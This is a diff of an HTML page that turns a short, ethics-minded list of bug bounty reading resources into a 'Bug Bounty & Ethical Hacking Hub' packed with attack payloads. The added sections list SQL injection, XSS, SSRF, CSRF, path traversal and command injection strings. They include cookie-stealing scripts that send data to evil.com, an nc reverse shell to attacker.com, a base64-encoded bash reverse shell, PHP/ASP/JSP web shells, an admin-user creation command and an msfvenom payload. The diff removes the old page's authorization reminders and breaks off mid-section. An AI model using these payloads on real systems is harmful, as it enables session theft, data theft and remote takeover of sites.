@@ -1,161 +1,1260 @@
-<!doctype html>
-
+<!DOCTYPE html>
 <html lang="hi">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Hacker & Bug Bounty Reading Materials — Clean Dark Page</title>
-  <style>
-    :root{--bg:#000;--muted:#bfbfbf;--accent:#00d1b2;--card:#0b0b0b}
-    html,body{height:100%;margin:0;font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,'Noto Sans',Helvetica,Arial; background:var(--bg);color:#fff}
-    .wrap{max-width:1000px;margin:32px auto;padding:28px;background:linear-gradient(180deg,rgba(255,255,255,0.02),transparent);border-radius:12px;box-shadow:0 6px 30px rgba(0,0,0,0.6)}
-    h1{margin:0 0 8px;font-size:28px;letter-spacing:-0.02em}
-    p.lead{color:var(--muted);margin-top:4px}
-    section{margin-top:20px}
-    .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:12px}
-    .card{background:var(--card);padding:14px;border-radius:10px;border:1px solid rgba(255,255,255,0.03)}
-    a{color:var(--accent);text-decoration:none}
-    a:hover{text-decoration:underline}
-    ul{margin:8px 0 0 18px;color:var(--muted)}
-    li{margin:6px 0}
-    .foot{margin-top:18px;color:var(--muted);font-size:13px}
-    .note{background:#0b0b0b;border-left:4px solid #334; padding:10px;border-radius:6px;color:var(--muted)}
-    @media (max-width:520px){.wrap{margin:12px;padding:16px}}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bug Bounty & Ethical Hacking Hub</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
+            color: #ffffff;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header */
+        .header {
+            background: linear-gradient(135deg, #ff0000 0%, #8b0000 100%);
+            padding: 20px 0;
+            box-shadow: 0 4px 20px rgba(255, 0, 0, 0.3);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 4px 20px rgba(255, 0, 0, 0.3); }
+            50% { box-shadow: 0 8px 40px rgba(255, 0, 0, 0.5); }
+            100% { box-shadow: 0 4px 20px rgba(255, 0, 0, 0.3); }
+        }
+
+        .header h1 {
+            text-align: center;
+            font-size: 2.5rem;
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+            from { text-shadow: 0 0 20px rgba(255, 255, 255, 0.5); }
+            to { text-shadow: 0 0 30px rgba(255, 255, 255, 0.8), 0 0 40px rgba(255, 0, 0, 0.6); }
+        }
+
+        .subtitle {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 1.2rem;
+            opacity: 0.9;
+        }
+
+        /* Navigation */
+        .nav {
+            background: rgba(0, 0, 0, 0.8);
+            padding: 15px 0;
+            backdrop-filter: blur(10px);
+            border-bottom: 2px solid #ff0000;
+        }
+
+        .nav-container {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 30px;
+        }
+
+        .nav-btn {
+            background: linear-gradient(135deg, #ff0000, #cc0000);
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.3);
+        }
+
+        .nav-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 0, 0, 0.5);
+            background: linear-gradient(135deg, #cc0000, #ff0000);
+        }
+
+        .nav-btn.active {
+            background: linear-gradient(135deg, #00ff00, #009900);
+            box-shadow: 0 4px 15px rgba(0, 255, 0, 0.3);
+        }
+
+        /* Main Content */
+        .main-content {
+            padding: 40px 0;
+        }
+
+        .section {
+            display: none;
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        .section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .phase-card, .category-card {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1) 0%, rgba(255, 255, 255, 0.05) 100%);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            border-radius: 15px;
+            padding: 25px;
+            margin: 20px 0;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .phase-card:hover, .category-card:hover {
+            transform: translateY(-5px);
+            border-color: rgba(255, 0, 0, 0.6);
+            box-shadow: 0 15px 45px rgba(255, 0, 0, 0.2);
+        }
+
+        .phase-title, .category-title {
+            color: #ff4444;
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+            text-shadow: 0 0 10px rgba(255, 68, 68, 0.5);
+        }
+
+        .step-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .tool-item, .technique-item {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 15px;
+            border-radius: 10px;
+            border-left: 4px solid #ff0000;
+        }
+
+        .tool-name, .technique-name {
+            color: #00ff00;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+
+        .tool-desc, .technique-desc {
+            color: #cccccc;
+            font-size: 0.9rem;
+        }
+
+        /* Question Section */
+        .question-section {
+            background: linear-gradient(135deg, rgba(255, 0, 0, 0.1) 0%, rgba(0, 0, 0, 0.3) 100%);
+            border-radius: 15px;
+            padding: 30px;
+            margin: 30px 0;
+        }
+
+        .question-form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .question-input, .question-textarea {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            border-radius: 8px;
+            padding: 12px;
+            color: white;
+            font-size: 1rem;
+        }
+
+        .question-input::placeholder, .question-textarea::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .submit-btn {
+            background: linear-gradient(135deg, #ff0000, #cc0000);
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+
+        .submit-btn:hover {
+            background: linear-gradient(135deg, #cc0000, #ff0000);
+            transform: translateY(-2px);
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 2rem;
+            }
+            
+            .nav-container {
+                flex-direction: column;
+                align-items: center;
+                gap: 15px;
+            }
+            
+            .step-content {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Scrollbar Styling */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #1a1a2e;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(135deg, #ff0000, #cc0000);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: linear-gradient(135deg, #cc0000, #ff0000);
+        }
+    </style>
 </head>
 <body>
-  <div class="wrap">
-    <h1>Hacker & Bug Bounty — Reading Materials</h1>
-    <p class="lead">Saf and minimal page — unwanted scripts removed. Dark background enabled. Neeche curated resources: beginner → advanced, labs, tools, ethics.</p><section>
-  <div class="grid">
-    <div class="card">
-      <strong>Quick Start (Beginner)</strong>
-      <ul>
-        <li>Understand basic web: HTTP, HTML, JS, cookies, headers</li>
-        <li>Learn Linux basics & command line (bash, ssh, pipes)</li>
-        <li>Start with OWASP Top 10 (in-depth study)</li>
-        <li>Practice on safe platforms (TryHackMe, Hacker101, PortSwigger Academy)</li>
-      </ul>
-    </div>
+    <header class="header">
+        <div class="container">
+            <h1>🎯 Bug Bounty & Ethical Hacking Hub</h1>
+            <p class="subtitle">Complete Knowledge Base for Security Researchers</p>
+        </div>
+    </header>
 
-    <div class="card">
-      <strong>Core Books & Reading</strong>
-      <ul>
-        <li><a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a> — must-read for web bugs</li>
-        <li>"The Web Application Hacker's Handbook" — deep web app attacks</li>
-        <li>"Hacking: The Art of Exploitation" — fundamentals & C</li>
-        <li>"Real-World Bug Hunting" — practical bug hunting writeups</li>
-      </ul>
-    </div>
+    <nav class="nav">
+        <div class="container">
+            <div class="nav-container">
+                <button class="nav-btn active" onclick="showSection('bug-bounty')">🐛 Bug Bounty Phases</button>
+                <button class="nav-btn" onclick="showSection('hacking-techniques')">💻 Hacking Techniques</button>
+                <button class="nav-btn" onclick="showSection('tools')">🛠️ Tools & Resources</button>
+                <button class="nav-btn" onclick="showSection('questions')">❓ Ask Questions</button>
+            </div>
+        </div>
+    </nav>
 
-    <div class="card">
-      <strong>Interactive Learning & Labs</strong>
-      <ul>
-        <li><a href="https://tryhackme.com">TryHackMe</a> — guided rooms and learning paths</li>
-        <li><a href="https://www.hackthebox.com">Hack The Box</a> — labs & pro labs</li>
-        <li><a href="https://portswigger.net/web-security">PortSwigger Academy</a> — free web security labs</li>
-        <li><a href="https://www.vulnhub.com">VulnHub</a> — downloadable VMs for practice</li>
-      </ul>
-    </div>
+    <main class="main-content">
+        <div class="container">
+            <!-- Bug Bounty Section -->
+            <section id="bug-bounty" class="section active">
+                <div class="phase-card">
+                    <h2 class="phase-title">Phase 1: Reconnaissance (Information Gathering)</h2>
+                    <div class="step-content">
+                        <div class="tool-item">
+                            <div class="tool-name">🔍 Passive Reconnaissance Tools</div>
+                            <div class="tool-desc">
+                                <strong>Tools:</strong> Shodan, Censys, Google Dorking, Wayback Machine, DNS Dumpster<br>
+                                <strong>Technique:</strong> Target information gathering without direct interaction<br>
+                                <strong>Commands:</strong> 
+                                • Google Dorks: site:target.com filetype:pdf<br>
+                                • Shodan: http.title:"target"<br>
+                                • DNS: nslookup, dig, fierce
+                            </div>
+                        </div>
+                        <div class="tool-item">
+                            <div class="tool-name">🌐 Active Reconnaissance</div>
+                            <div class="tool-desc">
+                                <strong>Tools:</strong> Nmap, Masscan, Zmap, Amass<br>
+                                <strong>Commands:</strong><br>
+                                • nmap -sS -O target.com<br>
+                                • amass enum -d target.com<br>
+                                • masscan -p1-10000 target.com --rate=1000
+                            </div>
+                        </div>
+                    </div>
+                </div>
 
-    <div class="card">
-      <strong>Bug Bounty Platforms</strong>
-      <ul>
-        <li><a href="https://hackerone.com">HackerOne</a> — public programs & reports</li>
-        <li><a href="https://www.bugcrowd.com">Bugcrowd</a> — private & public programs</li>
-        <li><a href="https://intigriti.com">Intigriti</a> — EU-focused platform</li>
-      </ul>
-    </div>
-  </div>
-</section>
+                <div class="phase-card">
+                    <h2 class="phase-title">Phase 2: Scanning & Enumeration</h2>
+                    <div class="step-content">
+                        <div class="tool-item">
+                            <div class="tool-name">🔧 Port & Service Scanning</div>
+                            <div class="tool-desc">
+                                <strong>Tools:</strong> Nmap, Rustscan, Unicornscan<br>
+                                <strong>Advanced Nmap:</strong><br>
+                                • nmap -sV -sC -O -A target.com<br>
+                                • nmap --script vuln target.com<br>
+                                • nmap -p- --min-rate=1000 target.com
+                            </div>
+                        </div>
+                        <div class="tool-item">
+                            <div class="tool-name">🌍 Web Application Scanning</div>
+                            <div class="tool-desc">
+                                <strong>Tools:</strong> Dirb, Gobuster, Ffuf, Dirsearch<br>
+                                <strong>Commands:</strong><br>
+                                • gobuster dir -u http://target.com -w wordlist.txt<br>
+                                • ffuf -u http://target.com/FUZZ -w wordlist.txt<br>
+                                • dirsearch.py -u target.com -e php,html,js
+                            </div>
+                        </div>
+                    </div>
+                </div>
 
-<section>
-  <div class="grid">
-    <div class="card">
-      <strong>Essential Tools</strong>
-      <ul>
-        <li>Burp Suite (Community & Pro) — proxy & active scanning</li>
-        <li>Nmap — network & port scanning</li>
-        <li>ffuf / dirb — directory & fuzzing</li>
-        <li>Sqlmap — automated SQLi testing (use responsibly)</li>
-        <li>Metasploit — exploitation framework (lab use)</li>
-      </ul>
-    </div>
+                <div class="phase-card">
+                    <h2 class="phase-title">Phase 3: Vulnerability Assessment</h2>
+                    <div class="step-content">
+                        <div class="tool-item">
+                            <div class="tool-name">🔍 Web Vulnerability Scanners</div>
+                            <div class="tool-desc">
+                                <strong>Tools:</strong> Burp Suite, OWASP ZAP, Nikto, Acunetix<br>
+                                <strong>Manual Testing:</strong><br>
+                                • SQL Injection: ' OR '1'='1<br>
+                                • XSS: &lt;script&gt;alert('XSS')&lt;/script&gt;<br>
+                                • Directory Traversal: ../../etc/passwd
+                            </div>
+                        </div>
+                        <div class="tool-item">
+                            <div class="tool-name">🔐 Authentication Testing</div>
+                            <div class="tool-desc">
+                                <strong>Tools:</strong> Hydra, Medusa, John the Ripper<br>
+                                <strong>Testing Methods:</strong><br>
+                                • Brute Force: hydra -l admin -P passwords.txt target.com http-post-form<br>
+                                • Session Management Testing<br>
+                                • Password Policy Analysis
+                            </div>
+                        </div>
+                    </div>
+                </div>
 
-    <div class="card">
-      <strong>Cheat-sheets & References</strong>
-      <ul>
-        <li><a href="https://cheatsheetseries.owasp.org/">OWASP Cheat Sheet Series</a></li>
-        <li>Payload repo lists (search GitHub for common payloads)</li>
-        <li>Burp macros, Intruder, Repeater workflows</li>
-      </ul>
-    </div>
+                <div class="phase-card">
+                    <h2 class="phase-title">Phase 4: Exploitation</h2>
+                    <div class="step-content">
+                        <div class="tool-item">
+                            <div class="tool-name">💥 Exploit Frameworks</div>
+                            <div class="tool-desc">
+                                <strong>Tools:</strong> Metasploit, ExploitDB, Nuclei<br>
+                                <strong>Commands:</strong><br>
+                                • msfconsole<br>
+                                • search type:exploit platform:linux<br>
+                                • use exploit/linux/http/php_cgi_arg_injection<br>
+                                • nuclei -u target.com -t vulnerabilities/
+                            </div>
+                        </div>
+                        <div class="tool-item">
+                            <div class="tool-name">🐚 Payload Generation</div>
+                            <div class="tool-desc">
+                                <strong>Tools:</strong> Msfvenom, Veil, Empire<br>
+                                <strong>Examples:</strong><br>
+                                • msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf > shell.elf<br>
+                                • Custom payload development
+                            </div>
+                        </div>
+                    </div>
+                </div>
 
-    <div class="card">
-      <strong>Writeups & Reports</strong>
-      <ul>
-        <li>Read real bug bounties & disclosure reports on HackerOne public reports</li>
-        <li>CTF writeups on GitHub/Gist — learn step-by-step thinking</li>
-      </ul>
-    </div>
+                <div class="phase-card">
+                    <h2 class="phase-title">Phase 5: Reporting & Documentation</h2>
+                    <div class="step-content">
+                        <div class="tool-item">
+                            <div class="tool-name">📋 Professional Reporting</div>
+                            <div class="tool-desc">
+                                <strong>Report Structure:</strong><br>
+                                • Executive Summary<br>
+                                • Technical Details<br>
+                                • Proof of Concept<br>
+                                • Impact Assessment<br>
+                                • Remediation Steps<br>
+                                <strong>Tools:</strong> Dradis, Serpico, PlexTrac
+                            </div>
+                        </div>
+                        <div class="tool-item">
+                            <div class="tool-name">🎯 Bug Bounty Platforms</div>
+                            <div class="tool-desc">
+                                <strong>Popular Platforms:</strong><br>
+                                • HackerOne • Bugcrowd • Intigriti<br>
+                                • YesWeHack • Open Bug Bounty<br>
+                                <strong>Submission Guidelines:</strong><br>
+                                • Clear vulnerability description<br>
+                                • Step-by-step reproduction<br>
+                                • Impact demonstration
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
 
-    <div class="card">
-      <strong>Courses & Videos</strong>
-      <ul>
-        <li>PortSwigger Academy (free)</li>
-        <li>Hacker101 videos & CTF (free)</li>
-        <li>Free resources on YouTube: live demo writeups, Burp tutorials</li>
-      </ul>
-    </div>
-  </div>
-</section>
+            <!-- Hacking Techniques Section -->
+            <section id="hacking-techniques" class="section">
+                <div class="category-card">
+                    <h2 class="category-title">🌐 Advanced Web Vulnerabilities & Payloads</h2>
+                    
+                    <div class="technique-item">
+                        <div class="technique-name">💉 SQL Injection - Complete Arsenal</div>
+                        <div class="technique-desc">
+                            <strong>🔸 Union-Based Payloads:</strong><br>
+                            • ' UNION SELECT 1,2,3,4,5,database()--<br>
+                            • ' UNION SELECT null,table_name,null FROM information_schema.tables--<br>
+                            • ' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users'--<br>
+                            • ' UNION SELECT username,password,null FROM users--<br><br>
+                            
+                            <strong>🔸 Boolean-Based Blind:</strong><br>
+                            • ' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--<br>
+                            • ' AND (SELECT COUNT(*) FROM users)>0--<br>
+                            • ' AND (SELECT LENGTH(database()))>5--<br><br>
+                            
+                            <strong>🔸 Time-Based Blind:</strong><br>
+                            • ' AND IF(1=1,SLEEP(5),0)--<br>
+                            • ' AND (SELECT SLEEP(5) FROM users WHERE username='admin')--<br>
+                            • '; WAITFOR DELAY '00:00:05'-- (MSSQL)<br>
+                            • '; SELECT pg_sleep(5)-- (PostgreSQL)<br><br>
+                            
+                            <strong>🔸 Error-Based:</strong><br>
+                            • ' AND extractvalue(1,concat(0x7e,version(),0x7e))--<br>
+                            • ' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--<br><br>
+                            
+                            <strong>🔸 Advanced SQLmap Commands:</strong><br>
+                            • sqlmap -u "url" --dbs --batch --random-agent<br>
+                            • sqlmap -u "url" -D database --tables<br>
+                            • sqlmap -u "url" -D database -T users --columns<br>
+                            • sqlmap -u "url" -D database -T users --dump<br>
+                            • sqlmap -u "url" --os-shell (RCE attempt)
+                        </div>
+                    </div>
 
-<section>
-  <div class="grid">
-    <div class="card">
-      <strong>CTFs & Practice Targets</strong>
-      <ul>
-        <li>picoCTF, Root-Me, CTFtime for events</li>
-        <li>Practice vulnerable apps: DVWA, Juice Shop</li>
-        <li>Hands-on VMs: TryHackMe rooms, HTB boxes</li>
-      </ul>
-    </div>
+                    <div class="technique-item">
+                        <div class="technique-name">⚡ Cross-Site Scripting (XSS) - All Variants</div>
+                        <div class="technique-desc">
+                            <strong>🔸 Reflected XSS:</strong><br>
+                            • &lt;script&gt;alert('XSS')&lt;/script&gt;<br>
+                            • &lt;img src=x onerror=alert('XSS')&gt;<br>
+                            • &lt;svg onload=alert('XSS')&gt;<br>
+                            • &lt;body onload=alert('XSS')&gt;<br>
+                            • &lt;iframe src=javascript:alert('XSS')&gt;&lt;/iframe&gt;<br><br>
+                            
+                            <strong>🔸 Filter Bypass Techniques:</strong><br>
+                            • &lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;<br>
+                            • &lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))&lt;/script&gt;<br>
+                            • &lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;<br>
+                            • &lt;img src="javascript:alert('XSS')"&gt;<br>
+                            • &lt;svg&gt;&lt;animatetransform onbegin=alert('XSS')&gt;<br><br>
+                            
+                            <strong>🔸 DOM-Based XSS:</strong><br>
+                            • document.location='http://evil.com/steal?'+document.cookie<br>
+                            • document.write('&lt;img src=http://evil.com/'+document.cookie+'&gt;')<br>
+                            • eval(location.hash.substr(1))<br><br>
+                            
+                            <strong>🔸 Stored/Persistent XSS:</strong><br>
+                            • &lt;script src=http://evil.com/xss.js&gt;&lt;/script&gt;<br>
+                            • &lt;script&gt;new Image().src='http://evil.com/steal?'+btoa(document.cookie)&lt;/script&gt;<br>
+                            • &lt;script&gt;fetch('http://evil.com/steal',{method:'POST',body:document.cookie})&lt;/script&gt;
+                        </div>
+                    </div>
 
-    <div class="card">
-      <strong>Communities & Blogs</strong>
-      <ul>
-        <li>r/netsec, r/bugbounty on Reddit — discussions & hints</li>
-        <li>Blogging sites: PortSwigger blog, HackerOne blog</li>
-        <li>Twitter/X: follow researchers & writeups</li>
-      </ul>
-    </div>
+                    <div class="technique-item">
+                        <div class="technique-name">🌍 Server-Side Request Forgery (SSRF)</div>
+                        <div class="technique-desc">
+                            <strong>🔸 Basic SSRF Payloads:</strong><br>
+                            • http://localhost:80/admin<br>
+                            • http://127.0.0.1:22<br>
+                            • http://169.254.169.254/latest/meta-data/ (AWS metadata)<br>
+                            • file:///etc/passwd<br>
+                            • gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a<br><br>
+                            
+                            <strong>🔸 Bypass Techniques:</strong><br>
+                            • http://0000::1:80/ (IPv6)<br>
+                            • http://①②⑦.⓪.⓪.① (Unicode)<br>
+                            • http://127.1:80<br>
+                            • http://localhost.evil.com<br>
+                            • http://127.0.0.1.nip.io<br><br>
+                            
+                            <strong>🔸 Cloud Metadata Endpoints:</strong><br>
+                            • AWS: http://169.254.169.254/latest/meta-data/<br>
+                            • Google Cloud: http://metadata.google.internal/computeMetadata/v1/<br>
+                            • Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
+                        </div>
+                    </div>
 
-    <div class="card">
-      <strong>Reporting & Templates</strong>
-      <ul>
-        <li>Always write clear PoC, steps to reproduce, impact, and remediation</li>
-        <li>Include screenshots, request/response captures, and minimal PoC</li>
-        <li>Respect disclosure rules of each program</li>
-      </ul>
-    </div>
+                    <div class="technique-item">
+                        <div class="technique-name">🔐 Cross-Site Request Forgery (CSRF)</div>
+                        <div class="technique-desc">
+                            <strong>🔸 HTML Form CSRF:</strong><br>
+                            &lt;form action="http://victim.com/transfer" method="POST"&gt;<br>
+                            &lt;input type="hidden" name="amount" value="10000"&gt;<br>
+                            &lt;input type="hidden" name="to" value="attacker"&gt;<br>
+                            &lt;input type="submit" value="Click me!"&gt;<br>
+                            &lt;/form&gt;<br><br>
+                            
+                            <strong>🔸 JavaScript CSRF:</strong><br>
+                            • fetch('http://victim.com/api/transfer', {method:'POST', credentials:'include', body:'amount=10000&to=attacker'})<br>
+                            • var xhr = new XMLHttpRequest(); xhr.open('POST', '/transfer'); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('amount=10000&to=attacker');<br><br>
+                            
+                            <strong>🔸 Image-based CSRF:</strong><br>
+                            • &lt;img src="http://victim.com/delete?id=123" style="display:none"&gt;
+                        </div>
+                    </div>
 
-    <div class="card">
-      <strong>Ethics & Legal</strong>
-      <ul>
-        <li class="muted">Only test on systems you own or have explicit permission for.</li>
-        <li>Use official programs and authorized labs; unauthorized testing is illegal.</li>
-        <li>Follow program scope and disclosure timelines.</li>
-      </ul>
-    </div>
-  </div>
-</section>
+                    <div class="technique-item">
+                        <div class="technique-name">📁 Path Traversal / Directory Traversal</div>
+                        <div class="technique-desc">
+                            <strong>🔸 Basic Payloads:</strong><br>
+                            • ../../../etc/passwd<br>
+                            • ..\..\..\..\windows\system32\drivers\etc\hosts<br>
+                            • ....//....//....//etc/passwd<br>
+                            • ..%2f..%2f..%2fetc%2fpasswd<br>
+                            • %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd<br><br>
+                            
+                            <strong>🔸 Advanced Bypass:</strong><br>
+                            • ..././..././..././etc/passwd<br>
+                            • %252e%252e%252fetc%252fpasswd<br>
+                            • /var/www/html/../../../etc/passwd<br>
+                            • php://filter/read=convert.base64-encode/resource=../../../etc/passwd<br><br>
+                            
+                            <strong>🔸 Windows Specific:</strong><br>
+                            • ..\..\..\windows\win.ini<br>
+                            • C:\windows\system32\drivers\etc\hosts<br>
+                            • %SYSTEMROOT%\system32\drivers\etc\hosts
+                        </div>
+                    </div>
 
-<section class="note">
-  <strong>Customization:</strong> Aap chahen to main is page ko aur personalize kar dunga — specific resource list, Hindi explanations, ya printable PDF format. Bas bataiye kya add karna hai.
-</section>
+                    <div class="technique-item">
+                        <div class="technique-name">💻 OS Command Injection</div>
+                        <div class="technique-desc">
+                            <strong>🔸 Unix/Linux Payloads:</strong><br>
+                            • ; cat /etc/passwd<br>
+                            • | whoami<br>
+                            • && id<br>
+                            • `cat /etc/shadow`<br>
+                            • $(cat /etc/passwd)<br>
+                            • ; nc -e /bin/bash attacker.com 4444<br><br>
+                            
+                            <strong>🔸 Windows Payloads:</strong><br>
+                            • & dir<br>
+                            • | type C:\windows\win.ini<br>
+                            • && whoami<br>
+                            • ; powershell -c "Get-Process"<br>
+                            • & net user hacker password123 /add<br><br>
+                            
+                            <strong>🔸 Advanced Techniques:</strong><br>
+                            • %0a cat /etc/passwd %0a<br>
+                            • {cat,/etc/passwd}<br>
+                            • cat${IFS}/etc/passwd<br>
+                            • echo$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=|base64 -d|bash)
+                        </div>
+                    </div>
 
-<div class="foot">Made safe: all external scripts removed. Use this file offline or host on your own. Good luck — stay ethical.</div>
+                    <div class="technique-item">
+                        <div class="technique-name">📤 File Upload Vulnerabilities</div>
+                        <div class="technique-desc">
+                            <strong>🔸 Bypass Techniques:</strong><br>
+                            • Change extension: shell.php → shell.php.jpg<br>
+                            • Double extension: shell.jpg.php<br>
+                            • Null byte: shell.php%00.jpg<br>
+                            • Case variation: shell.PHP, shell.PhP<br>
+                            • Special chars: shell.php., shell.php::$DATA<br><br>
+                            
+                            <strong>🔸 Web Shell Payloads:</strong><br>
+                            • PHP: &lt;?php system($_GET['cmd']); ?&gt;<br>
+                            • ASP: &lt;%eval request("cmd")%&gt;<br>
+                            • JSP: &lt;%Runtime.getRuntime().exec(request.getParameter("cmd"));%&gt;<br><br>
+                            
+                            <strong>🔸 Magic Bytes Manipulation:</strong><br>
+                            • GIF89a + PHP code<br>
+                            • PNG header + malicious payload<br>
+                            • JPEG header manipulation
+                        </div>
+                    </div>
 
-  </div>
+                    <div class="technique-item">
+                        <div class="technique-name">🔓 Authentication Bypass</div>
+                        <div class="technique-desc">
+                            <strong>🔸 SQL Auth Bypass:</strong><br>
+                            • admin'--<br>
+                            • admin'/*<br>
+                            • ' or 1=1--<br>
+                            • ' or 1=1#<br>
+                            • ') or '1'='1--<br>
+                            • ' or 1=1 limit 1--<br><br>
+                            
+                            <strong>🔸 NoSQL Injection:</strong><br>
+                            • {"$ne": null}<br>
+                            • {"$regex": ".*"}<br>
+                            • {"$where": "this.username == this.password"}<br><br>
+                            
+                            <strong>🔸 JWT Attacks:</strong><br>
+                            • Algorithm confusion (RS256 → HS256)<br>
+                            • None algorithm bypass<br>
+                            • Weak secret key brute force
+                        </div>
+                    </div>
+
+                    <div class="technique-item">
+                        <div class="technique-name">🔄 Business Logic Flaws</div>
+                        <div class="technique-desc">
+                            <strong>🔸 Common Scenarios:</strong><br>
+                            • Race conditions in payment processing<br>
+                            • Price manipulation (-$100.00)<br>
+                            • Workflow bypass (skip payment step)<br>
+                            • Parameter pollution<br>
+                            • Integer overflow/underflow<br><br>
+                            
+                            <strong>🔸 Testing Techniques:</strong><br>
+                            • Concurrent requests (Burp Intruder)<br>
+                            • Parameter manipulation<br>
+                            • Workflow step skipping<br>
+                            • Boundary value analysis
+                        </div>
+                    </div>
+                </div>
+
+                <div class="category-card">
+                    <h2 class="category-title">🎯 Advanced Hacking Phases (5 Steps)</h2>
+                    
+                    <div class="technique-item">
+                        <div class="technique-name">Phase 1: 🔍 Advanced Reconnaissance</div>
+                        <div class="technique-desc">
+                            <strong>🔸 OSINT Tools Arsenal:</strong><br>
+                            • theHarvester: theHarvester -d target.com -b all<br>
+                            • Maltego: Social network mapping<br>
+                            • Shodan: shodan search "org:target"<br>
+                            • Censys: censys search "target.com"<br>
+                            • SpiderFoot: Automated OSINT<br>
+                            • Recon-ng: marketplace install all; modules load<br><br>
+                            
+                            <strong>🔸 GitHub/Code Repository Recon:</strong><br>
+                            • GitDorker: GitHub secrets scanning<br>
+                            • Gitrob: GitHub organization analysis<br>
+                            • TruffleHog: Git secrets finder<br>
+                            • GitLeaks: Git credential scanner<br><br>
+                            
+                            <strong>🔸 Advanced Google Dorking:</strong><br>
+                            • site:target.com filetype:pdf "confidential"<br>
+                            • site:target.com inurl:login<br>
+                            • site:target.com ext:log<br>
+                            • intitle:"index of" site:target.com<br>
+                            • site:pastebin.com "target.com"
+                        </div>
+                    </div>
+
+                    <div class="technique-item">
+                        <div class="technique-name">Phase 2: 🌐 Network Infiltration</div>
+                        <div class="technique-desc">
+                            <strong>🔸 Advanced Port Scanning:</strong><br>
+                            • masscan -p1-65535 target.com --rate=10000<br>
+                            • nmap -sS -sV -O --script=vuln target.com<br>
+                            • rustscan -a target.com -- -sV -sC<br>
+                            • unicornscan -mT target.com:1-65535<br><br>
+                            
+                            <strong>🔸 Service Enumeration:</strong><br>
+                            • SMB: enum4linux -a target.com<br>
+                            • SNMP: snmpwalk -c public -v1 target.com<br>
+                            • DNS: fierce -dns target.com<br>
+                            • LDAP: ldapsearch -h target.com -x<br><br>
+                            
+                            <strong>🔸 Vulnerability Scanners:</strong><br>
+                            • Nuclei: nuclei -u target.com -t vulnerabilities/<br>
+                            • OpenVAS: Full network vulnerability assessment<br>
+                            • Nessus: Professional vulnerability scanner<br>
+                            • Nexpose: Enterprise vulnerability management
+                        </div>
+                    </div>
+
+                    <div class="technique-item">
+                        <div class="technique-name">Phase 3: 💥 Initial Access & Exploitation</div>
+                        <div class="technique-desc">
+                            <strong>🔸 Web Application Exploitation:</strong><br>
+                            • Burp Suite Professional: Advanced web testing<br>
+                            • OWASP ZAP: Automated web scanning<br>
+                            • W3af: Web application attack framework<br>
+                            • Arachni: High-performance web scanner<br><br>
+                            
+                            <strong>🔸 Exploit Development:</strong><br>
